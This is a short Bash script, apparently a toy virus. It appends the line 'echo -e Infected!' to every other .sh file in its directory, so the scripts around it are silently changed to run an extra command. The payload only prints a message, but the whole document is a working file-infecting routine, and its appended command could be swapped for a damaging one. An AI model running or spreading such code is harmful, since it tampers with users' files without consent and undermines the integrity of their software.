#! /bin/bash

files=($(ls *.sh | tr " " "\n"))
filename=$(basename $0)

for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -e "\necho -e Infected!" >> "$file"
    fi
done

exit 0